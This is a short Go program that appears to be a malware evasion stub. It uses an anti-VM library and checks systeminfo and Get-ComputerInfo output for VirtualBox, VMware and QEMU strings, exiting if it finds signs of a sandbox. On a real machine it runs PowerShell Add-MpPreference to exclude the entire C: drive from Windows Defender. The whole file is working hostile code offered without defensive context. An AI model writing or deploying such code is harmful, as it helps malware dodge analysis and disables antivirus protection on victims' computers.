package main

import (
	"github.com/p3tr0v/chacal/antivm"
	"os"
	"os/exec"
	"strings"
)

func main() {
	if antivm.BySizeDisk(100) {
		os.Exit(0)
	}
	if antivm.IsVirtualDisk() {
		os.Exit(0)
	}
	if antivm.ByMacAddress() {
		os.Exit(0)
	}
	systeminfo, _ := exec.Command("systeminfo").Output()
	info := strings.ToLower(string(systeminfo))
	computerinfo, _ := exec.Command("powershell", "-c", "Get-ComputerInfo").Output()
	info += strings.ToLower(string(computerinfo))
	blacklist := []string{"vbox", "virtual machine", "virtualbox", "vmware", "qemu"}
	for _, word := range blacklist {
		if strings.Contains(info, word) {
			os.Exit(0)
		}
	}
	exec.Command("powershell", "-c", "Add-MpPreference", "-ExclusionPath", "\"C:\"").Output()
}
